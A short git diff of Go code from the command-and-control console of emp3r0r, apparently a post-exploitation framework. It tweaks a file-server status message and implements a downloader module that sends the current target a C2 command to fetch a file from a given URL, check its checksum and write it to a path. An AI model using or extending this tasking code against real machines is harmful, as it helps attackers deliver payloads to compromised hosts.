@@ -6,7 +6,6 @@ package cc
 import (
 	"fmt"
 
-	"github.com/fatih/color"
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 )
 
@@ -29,9 +28,26 @@ func moduleFileServer() {
 		CliPrintError("SendCmd: %v", err)
 		return
 	}
-	CliPrintInfo("File server is now %s", color.HiGreenString(server_switch))
+	CliPrintInfo("File server (port %s) is now %s", portOpt.Val, server_switch)
 }
 
 func moduleDownloader() {
-	CliPrintError("Not implemented yet")
+	requiredOptions := []string{"download_url", "checksum", "path"}
+	for _, opt := range requiredOptions {
+		if _, ok := Options[opt]; !ok {
+			CliPrintError("Option '%s' not found", opt)
+			return
+		}
+	}
+
+	download_url := Options["download_url"].Val
+	checksum := Options["checksum"].Val
+	path := Options["path"].Val
+
+	cmd := fmt.Sprintf("%s --download_url %s --checksum %s --path %s", emp3r0r_data.C2CmdFileDownloader, download_url, checksum, path)
+	err = SendCmdToCurrentTarget(cmd, "")
+	if err != nil {
+		CliPrintError("SendCmd: %v", err)
+		return
+	}
 }
